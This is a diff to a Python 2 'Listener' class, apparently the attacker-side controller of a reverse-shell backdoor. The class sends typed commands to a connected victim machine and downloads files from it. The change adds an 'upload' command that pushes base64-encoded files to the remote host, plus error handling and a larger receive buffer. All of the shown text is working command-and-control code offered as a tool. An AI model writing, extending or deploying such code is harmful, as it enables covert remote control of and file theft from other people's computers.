@@ -28,7 +28,7 @@ class Listener:
         json_data = ""
         while True:
             try:
-                json_data = json_data + self.connection.recv(2048)
+                json_data = json_data + self.connection.recv(4098)
                 return json.loads(json_data)
             except ValueError:
                 continue
@@ -45,16 +45,30 @@ class Listener:
             target_file.write(base64.b64decode(content))
             return "[+] Download Successful."
 
+    def read_file(self, path):
+        with open(path, "rb") as target_file:
+            return base64.b64encode(target_file.read())
+
     def run(self):
         while True:
-            cmd = raw_input(">> ")
-            if not cmd:
+            try:
+                cmd = raw_input(">> ")
+                if not cmd:
+                    continue
+                cmd = cmd.split(" ")
+
+                if cmd[0] == "upload" and len(cmd) > 1:
+                    file_content = self.read_file(cmd[1])
+                    cmd.append(file_content)
+
+                result = self.exec_remote(cmd)
+
+                if cmd[0] == "download" and len(cmd) > 1:
+                    result = self.write_file(cmd[1],result)
+                print result
+            except Exception:
+                print "[-] Listener Error."
                 continue
-            cmd = cmd.split(" ")
-            result = self.exec_remote(cmd)
-            if cmd[0] == "download" and len(cmd) > 1:
-                result = self.write_file(cmd[1],result)
-            print result
 
 
 listener = Listener("127.0.0.1",2508)
